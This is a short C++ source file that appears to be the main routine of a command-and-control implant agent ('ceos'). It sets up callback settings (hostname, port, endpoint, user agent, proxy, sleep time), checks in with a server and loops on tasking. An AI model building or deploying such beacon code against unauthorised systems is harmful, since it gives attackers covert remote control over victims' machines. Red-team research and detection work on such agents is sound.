// ceos.cpp : Ce fichier contient la fonction 'main'. L'exécution du programme commence et se termine à cet endroit.
//

#include "ceos.h"
#include "Config.h"

CONFIG_CEOS* ceosConfig = nullptr;

VOID ceosMain()
{
    ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));
    // Config Init
    ceosConfig->agentID = (PCHAR)initUUID;
    ceosConfig->hostName = (PWCHAR)hostname;
    ceosConfig->httpPort = port;
    ceosConfig->endPoint = (PWCHAR)endpoint;
    ceosConfig->userAgent = (PWCHAR)useragent;
    ceosConfig->httpMethod = (PWCHAR)httpmethod;
    ceosConfig->isSSL = ssl;
    ceosConfig->isProxyEnabled = proxyenabled;
    ceosConfig->proxyURL = (PWCHAR)proxyurl;
    ceosConfig->sleeptime = sleep_time;

    PParser ResponseParser = checkin();
    parseCheckin(ResponseParser);
    while (TRUE)
        routine();
}


VOID setUUID(PCHAR newUUID)
{
    ceosConfig->agentID = newUUID;
    return;
}